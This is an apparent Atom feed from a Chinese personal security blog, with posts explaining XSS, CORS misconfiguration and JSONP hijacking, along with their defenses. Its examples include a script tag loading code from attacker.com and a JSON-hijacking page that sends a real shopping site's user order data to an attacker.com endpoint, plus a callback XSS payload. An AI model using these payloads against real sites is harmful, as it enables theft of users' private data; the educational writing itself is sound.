<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://zzggtt.github.io</id>
    <title>ZG0T01</title>
    <updated>2020-08-02T07:40:47.125Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://zzggtt.github.io"/>
    <link rel="self" href="https://zzggtt.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://zzggtt.github.io/images/avatar.png</logo>
    <icon>https://zzggtt.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, ZG0T01</rights>
    <entry>
        <title type="html"><![CDATA[URL跳转测试]]></title>
        <id>https://zzggtt.github.io/post/ksyuncom/</id>
        <link href="https://zzggtt.github.io/post/ksyuncom/">
        </link>
        <updated>2020-08-02T07:40:05.000Z</updated>
        <content type="html"><![CDATA[<p>URL跳转测试</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[前端安全之XSS]]></title>
        <id>https://zzggtt.github.io/post/qian-duan-an-quan-zhi-xss/</id>
        <link href="https://zzggtt.github.io/post/qian-duan-an-quan-zhi-xss/">
        </link>
        <updated>2020-07-26T09:46:13.000Z</updated>
        <content type="html"><![CDATA[<h2 id="我的xss学习">我的XSS学习：</h2>
<h3 id="一-理解漏洞的原理">一、理解漏洞的原理</h3>
<blockquote>
<p>XSS即跨站脚本攻击。发生在目标网站中目标用户的<strong>浏览器层</strong>面上。当用户的浏览器<strong>渲染整个HTML文档</strong>时，出现了不被预期的<strong>脚本指令</strong>并<strong>执行</strong>时，XSS就会发送。</p>
</blockquote>
<ul>
<li>
<p>强调了场景：需要支持HTML解析和<code>JavaScript解析</code></p>
</li>
<li>
<p>恶意数据被js引擎当作脚本解析执行</p>
</li>
</ul>
<h4 id="1-浏览器渲染html文档的过程">1、浏览器渲染HTML文档的过程</h4>
<p>浏览器获得从服务端返回的HTML文档后，会<code>自上而下</code>的加载html，并且在加载的过程解析渲染（同步进行）。</p>
<p><strong>解析流程：</strong></p>
<blockquote>
<ol>
<li>用户输入网址（假设是个html页面，并且是第一次访问），浏览器向服务器发出请求，服务器返回html文件；</li>
<li>浏览器的DOM引擎开始解析html标签，发现＜head＞标签内有一个＜link＞标签引用外部CSS文件；</li>
<li>浏览器又发出CSS文件的请求，服务器返回这个CSS文件；</li>
<li>浏览器继续载入html中＜body＞部分的代码，并且CSS文件已经拿到手了，可以开始渲染页面了；</li>
<li>浏览器在代码中发现一个＜img＞标签引用了一张图片，向服务器发出请求。此时浏览器不会等到图片下载完，而是继续渲染后面的代码；</li>
<li>服务器返回图片文件，由于图片占用了一定面积，影响了后面段落的排布，因此浏览器需要回过头来重新渲染这部分代码；</li>
<li><strong>浏览器发现了＜script＞标签，里面包含一行Javascript代码的，浏览器开始调用js引擎；</strong></li>
<li>**js引擎开始解析Javascript脚本指令，并执行了这条语句。**它命令浏览器隐藏掉代码中的某个＜div＞ （style.display=”none”）。突然少了这么一个元素，浏览器不得不重新渲染这部分代码；</li>
<li>终于等到了＜/html＞的到来，浏览器泪流满面……</li>
<li>等等，还没完，用户点了一下界面中的“换肤”按钮，Javascript让浏览器换了一下＜link＞标签的CSS路径；</li>
<li>浏览器召集了在座的各位＜div＞＜span＞＜ul＞＜li＞们，“大伙儿收拾收拾行李，咱得重新来过……”，浏览器向服务器请求了新的CSS文件，重新渲染页面。</li>
</ol>
</blockquote>
<p>参考文章：</p>
<blockquote>
<p><a href="http://igoro.com/archive/what-really-happens-when-you-navigate-to-a-url/">What really happens when you navigate to a URL</a></p>
<p><a href="https://github.com/ScrappyZhang/How-browsers-work">how browser work</a></p>
<p><a href="https://blog.csdn.net/xiaozhuxmen/article/details/52014901">浏览器加载、解析、渲染的过程</a></p>
</blockquote>
<h4 id="2-脚本指令">2、脚本指令</h4>
<p>思考一个问题：在哪些环境下会被浏览器识别为脚本指令呢？</p>
<ul>
<li>
<p>script标签之间</p>
<pre><code class="language-javascript">&lt;script&gt;【脚本环境】&lt;/script&gt;
</code></pre>
</li>
<li>
<p>作为on*事件的属性值</p>
<p>on*属性的值为JavaScript脚本：<a href="https://www.w3school.com.cn/tags/html_ref_eventattributes.asp">HTML事件属性</a></p>
<pre><code class="language-html">&lt;img src=# onerror=&quot;【脚本环境】&quot;&gt;
</code></pre>
</li>
<li>
<p>伪协议【href、src、action等属性值】</p>
<p>1、href、src、action属性的值为URL（分为绝对URL和相对URL）：<a href="https://www.w3school.com.cn/tags/att_form_action.asp">action 属性</a>、<a href="https://www.w3school.com.cn/tags/att_a_href.asp">href属性</a>、<a href="https://www.w3school.com.cn/tags/att_img_src.asp">src属性</a></p>
<p>2、伪协议</p>
<p>​		伪协议不同于http协议，ftp协议等（真协议），它是一种非标准化的协议，是为关联应用程序而使用的。</p>
<p>​		比如：tencent://(关联QQ)、data:(用base64编码来在浏览器端输出二进制文件)、javascript:URL(通过链接来调用js函数)。</p>
<p>​		例如：</p>
<pre><code class="language-html">&lt;script&gt;
  	function popup(url){
    window.open(url,&quot;popup&quot;,&quot;width=100,height=200&quot;)
  }
  &lt;/script&gt;



  &lt;a href:&quot;javascript:popup(http://www.baidu.com)&quot;&gt;open baidu&lt;/a&gt;
</code></pre>
<p>总结起来：</p>
<pre><code class="language-html">  &lt;a href:&quot;javascript:【脚本环境】&quot;&gt;
  &lt;iframe src=&quot;data:text/html;base64,【脚本环境(需要base64编码)】&quot;&gt;&lt;/iframe&gt;
</code></pre>
</li>
</ul>
<h3 id="二-如何防御xss漏洞">二、如何防御XSS漏洞</h3>
<ul>
<li>
<p><strong>Filter</strong></p>
<ul>
<li>过滤标签</li>
<li>过滤关键字</li>
<li>黑白名单</li>
</ul>
</li>
<li>
<p><strong>转义</strong></p>
<ul>
<li>
<p>HTML转义</p>
</li>
<li>
<p>JavaScript转义</p>
<p>根据不同的场景，指定相应的转义。</p>
</li>
</ul>
</li>
<li>
<p><strong>HTTP-Only</strong></p>
<p>只能保护 cookie 不被盗取，对其他场景帮助不大；</p>
</li>
<li>
<p><strong>CSP</strong></p>
<p>可以有效拦截几乎所有类型的 XSS，但是配置部署不方便，误报比较多。</p>
</li>
</ul>
<h3 id="三-xss该如何利用">三、XSS该如何利用</h3>
<p>很多时候输入点的内容长度是有限制的，真正的XSS攻击弹窗是毫无意义的 ，所以攻击代码可能会比较长。</p>
<p>一般采用嵌入一段第三方域上的脚本资源，这样的好处是攻击代码容易控制。(script可以嵌入第三方域的资源，并和本域的脚本指令一样，存在于整个上下文环境中，这是浏览器所允许的)</p>
<pre><code class="language-html">&lt;script src=&quot;https://www.attacker.com/xss.js&quot;&gt;&lt;/script&gt;
</code></pre>
<p>至于利用方式，可以参考 beef，比如：</p>
<ul>
<li>普通用户（Cookies、隐私数据、IP、日志、相片、邮件、CSRF 等）</li>
<li>管理员（后台地址、页面源码、管理员信息、CSRF 等）</li>
<li>客户端攻击（浏览器特权域、插件、APP、WebView 等）</li>
<li>内网渗透（端口扫描、ST2利用、路由器）</li>
<li>键盘记录、rootkit、蠕虫攻击、水坑、钓鱼、劫持 ）</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[前端跨域之cors安全]]></title>
        <id>https://zzggtt.github.io/post/qian-duan-kua-yu-zhi-cors-an-quan/</id>
        <link href="https://zzggtt.github.io/post/qian-duan-kua-yu-zhi-cors-an-quan/">
        </link>
        <updated>2020-07-26T09:13:15.000Z</updated>
        <content type="html"><![CDATA[<h2 id="前景">前景</h2>
<p>AJAX是严格遵守浏览器的同源策略（SOP）的，既不能跨域读取数据，也不能跨域发送数据（跨站请求可以正常发起，但是返回结果会被浏览器拦截）。</p>
<p>随着Web应用的发展，Web开发者需要读取跨域网络资源内容(例如，电商网站想通过用户浏览器加载第三方快递网站的物流信息)，开发人员提出了一些临时折衷方案来满足需求，例如JSONP ，但是这些折衷方案带来了许多安全问题。</p>
<p>于是W3C 设计了 CORS 协议标准，用于替代 JSONP，实现更安全规范地支持跨域网络资源共享。从2009年开始，CORS协议就已经被各大浏览器（如 Chrome， Firefox等）支持，目前已经被主流网站广泛部署使用。</p>
<p>浏览器支持在 API 容器中（例如 <code>XMLHttpRequest</code>或 <code>Fetch</code> ）使用 CORS，以降低跨域 HTTP 请求所带来的风险。</p>
<p><strong>以百度为例：</strong><br>
<img src="https://zzggtt.github.io/post-images/1595754879551.png" alt="" loading="lazy"></p>
<h3 id="一-cors">一、CORS</h3>
<h4 id="1-cors工作流程">1、CORS工作流程</h4>
<ol>
<li>用户浏览器对资源服务器发起一个跨域请求，并在请求头中添加<code>Origin头</code>，用于声明请求方的来源。</li>
<li>资源服务器根据Origin头返回访问控制策略(<code>Access-Control-Allow-Origin</code>响应头)，并在其中声明允许读取响应内容的源。</li>
<li>浏览器检查资源服务器在<code>Access-Control-Allow-Origin</code>头中声明的源，是否与请求方的源相符，如果相符合，则允许请求方脚本读取响应内容，否则不允许。</li>
</ol>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1595754886041.png" alt="" loading="lazy"></figure>
<h4 id="2-附带身份凭证的请求">2、附带身份凭证的请求</h4>
<p>一般而言，对于跨域 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest"><code>XMLHttpRequest</code></a> 或 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API">Fetch</a> 请求，浏览器<strong>不会</strong>发送<code>credentials</code>（包括<code>Cookie</code>，TLS客户端证书和代理验证信息）。如果要发送凭证信息，需要设置 <code>XMLHttpRequest</code>的某个特殊标志位。</p>
<pre><code class="language-html">var xml = new XMLHttpRequest();
xml.withCredentials = true; //发送凭证
</code></pre>
<p>如果跨域请求中带了<code>credentials</code>，那么浏览器会检查资源服务器返回的响应头中<code>Access-Control-Allow-Credentials</code>头是否设置为<code>true</code>，如果是，则允许请求方读取响应内容，否则，不允许。</p>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1595754891917.png" alt="" loading="lazy"></figure>
<blockquote>
<p>为了Web开发者配置方便，W3C的CORS提供了<code>Access-Control-Allow-Origin:*</code>，用于表示允许任意域访问。考虑到这种权限过于宽松，CORS又规定，<code>Access-Control-Allow-Origin:*</code>与 <code>Access-Control-Allow-Credentials:true</code>不能同时使用。浏览器会对这种误配置报错。</p>
</blockquote>
<h2 id="二-cors配置安全问题">二、CORS配置安全问题</h2>
<p>CORS协议的本质是由服务端配置的策略指导客户端浏览器，以实现跨域资源共享。但是一旦服务器端访问控制策略配置出现错误，就会出现浏览器SOP被绕过，导致用户的信息被劫持。</p>
<h4 id="1-反射origin">1、反射Origin</h4>
<p>因为CORS标准规定，<code>Access-Control-Allow-Origin</code>只能配置为单个<code>origin</code>, <code>null</code>或<code>*</code>。如果开发者想要实现同时与多个域名共享域名的需求，则需要专门编写代码或者使用framework来协助动态生成访问控制策略。这种动态生成的做法增加了开发者配置难度。</p>
<p>最简单地动态生成访问控制策略的方法，就是在<code>Access-Control-Allow-Origin</code>中反射请求的<code>Origin</code>值。例如，下面是一个错误 Nginx 配置示例：</p>
<pre><code class="language-nginx">add_header &quot;Access-Control-Allow-Origin&quot; $http_origin;
add_header &quot;Access-Control-Allow-Credentials&quot; &quot;true&quot;;
</code></pre>
<h4 id="2-校验origin不严格">2、校验Origin不严格</h4>
<h4 id="3-null">3、null</h4>
<p>CORS协议复用了<code>Origin</code>头，但在CORS标准中同样缺乏对跨域请求<code>Origin</code>中<code>null</code>明确的定义和限制。有些开发者在网站上配置信任<code>null</code>，用于与本地file页面共享数据，如下所示：</p>
<pre><code class="language-http">Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials:true
</code></pre>
<p>但是事实上，除了本地file页面的跨域请求Origin头为null外，攻击者还可以从任意域下通过iframe sandbox构造Origin为null的跨域请求，如下是一段示意代码：</p>
<pre><code class="language-html">&lt;iframe
    sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot;
    src=&quot;data:text/html,&lt;script&gt;XMLHttpRequest here&lt;/script&gt;&quot;
&gt;
&lt;/iframe&gt;
</code></pre>
<p>这就意味着任何配置有<code>Access-Control-Allow-Origin: null</code>和<code>Access-Control-Allow-Credentials: true</code>的网站等同于没有浏览器SOP的保护，都可以被其他任意域以这种方式读取内容。</p>
<h4 id="4-https域信任http域">4、HTTPS域信任HTTP域</h4>
<p>HTTPS协议被设计用于在不安全的中间网络中进行安全通信。即使在中间人网络环境下，攻击者也应该无法读取HTTPS网站的内容。但是如果该HTTPS网站配置了CORS且信任HTTP域，那么中间人攻击者可以先劫持受信任HTTP域，然后通过这个域发送跨域请求到HTTPS网站，间接读取HTTPS域下的受保护内容。具体流程如图所示，中间人攻击者可以可以利用<code>http://example.com</code>网站为跳板，窃取 HTTPS 网站的内容。</p>
<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1595754899321.png" alt="" loading="lazy"></figure>
<h2 id="三-参考资料">三、参考资料</h2>
<blockquote>
<p>https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS</p>
<p>https://research.qianxin.com/archives/290</p>
</blockquote>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[前端跨域之jsonp安全]]></title>
        <id>https://zzggtt.github.io/post/jsonp-an-quan/</id>
        <link href="https://zzggtt.github.io/post/jsonp-an-quan/">
        </link>
        <updated>2020-07-25T09:38:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>今天在亮神的博客看见一句话：</p>
<blockquote>
<p>在写的过程中，我深深体会到分享者才是学习中的最大受益者，由于需要成文章，所以需要查阅大量的资料。在整个过程中，又学习到很多知识点。</p>
</blockquote>
<h3 id="一-jsonp原理">一、JSONP原理</h3>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1595666965734.png" alt="" loading="lazy"></figure>
<p><strong>参考文章</strong>：</p>
<blockquote>
<p>https://blog.csdn.net/hansexploration/article/details/80314948</p>
<p>https://www.cnblogs.com/soyxiaobi/p/9616011.html</p>
</blockquote>
<h3 id="二-jsonp安全问题">二、JSONP安全问题</h3>
<h4 id="1-跨域劫持">1、跨域劫持</h4>
<p>JSONP虽然解决了前端AJAX无法跨域的问题，但是也带来了风险：JSON Hijaking（JSON 劫持）。JSON Hijacking技术非常经典，攻击的过程是CSRF，但是是对JSONP返回的JSON数据进行劫持。</p>
<p>当目标网站通过JSONP的方式来跨域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的JSONP利用页面，然后诱导已登陆目标网站的用户访问恶意页面，以达到劫持用户敏感信息的目的。</p>
<p>以乌云网上报告的一个例子（wooyun-2015-0118712）来分析：</p>
<p>苏宁易购基本所有jsonp接口都没有做防护，导致第三方网站可调用苏宁的jsonp接口获取到用户敏感信息：</p>
<ul>
<li>
<p>漏洞处功能详细说明：</p>
<blockquote>
<ul>
<li>获取用户登陆状态的接口[是否登陆，会员编号] http://my.suning.com/authStatus?callback=jQuery17206592</li>
<li>获取用户个人信息的接口[加星的邮箱，用户级别，用户安全等级等] http://my.suning.com/memberInfoPageHead.do?callback=jQuery1720402</li>
<li>获取用户订单信息[下单时间，订单号，订单商品，订单金额，订单状态等] http://www.suning.com/emall/myShoppingOrderCmd?itemNum=3&amp;callback=jQuery1720659299</li>
<li>获取用户地址簿接口[所有姓名、住址、加星手机号] http://my.suning.com/address.do?callback=jQuery172081</li>
</ul>
</blockquote>
</li>
<li>
<p>攻击流程：</p>
<ul>
<li>
<p>攻击者构造一个劫持页面：</p>
<pre><code class="language-html">&lt;!--编写一个劫持函数：hijack --&gt;
&lt;script&gt;
    function hijack(){
        //alert(data);
        new Image().src=&quot;http://www.attacker.com/hijack.php?hi=&quot; + escape(data);//将劫持到的数据发送到攻击者服务器上
    }
&lt;/script&gt;

&lt;!--获取用户订单信息接口：使用hijack为回调函数--&gt;
&lt;script src=&quot;http://www.suning.com/emall/myShoppingOrderCmd?itemNum=3&amp;callback=hijack&quot;&gt;&lt;/script&gt;
</code></pre>
</li>
<li>
<p>然后攻击者欺骗已登陆目标网站（苏宁）的用户访问该页面。</p>
<blockquote>
<p>这个攻击过程其实是浏览器发起了一个 CSRF GET 请求。由于目标用户已登陆，所以浏览器发起请求会带上目标用户的cookie身份认证信息，并且服务端返回敏感信息。</p>
</blockquote>
</li>
<li>
<p>然后目标用户的订单信息就会被劫持发送到攻击者服务器上。</p>
</li>
</ul>
</li>
</ul>
<h4 id="2-callback可控导致的xss">2、callback可控导致的xss</h4>
<p>服务端在返回数据时，如果没有严格定义好Content-Type（Content-Type: application/json），再加上callback这个输出点没有进行过滤，而直接输出就会导致一个典型的XSS。</p>
<p>例如如下一个jsonp接口：</p>
<pre><code class="language-html">http://example/ajax/services/search/web?v=1.0&amp;q=?&amp;callback=?
</code></pre>
<p>客户端除了传递<code>q=?</code>以外，还会传递一个回调函数名给服务端<code>callback=?</code>。</p>
<p>如果Content-Type（application / javascript）和callback未作过滤，直接返回。通过下面的payload就可以构造一个XSS：</p>
<pre><code class="language-html">http://example/ajax/services/search/web?v=1.0&amp;q=?&amp;callback=&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<h3 id="三-jsonp防御措施">三、JSONP防御措施</h3>
<h4 id="1-验证refere">1、验证Refere</h4>
<blockquote>
<p>这个攻击过程其实是浏览器发起了一个 CSRF GET 请求。由于目标用户已登陆，所以浏览器发起请求会带上目标用户的cookie身份认证信息，并且服务端返回敏感信息。</p>
</blockquote>
<h4 id="2-token">2、token</h4>
<h4 id="3-严格定义content-typeapplicationjson">3、严格定义Content-Type:application/json</h4>
<blockquote>
<p>这样的防御机制导致了浏览器不解析恶意插入的 XSS 代码。</p>
</blockquote>
<h4 id="4-过滤callback以及json数据输出">4、过滤callback以及json数据输出</h4>
<blockquote>
<p>还可以在 Callback 输出之前加入其他字符(如：/**/、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。</p>
</blockquote>
<p><strong>参考文章：</strong></p>
<blockquote>
<p>https://blog.knownsec.com/2015/03/jsonp_security_technic/</p>
</blockquote>
]]></content>
    </entry>
</feed>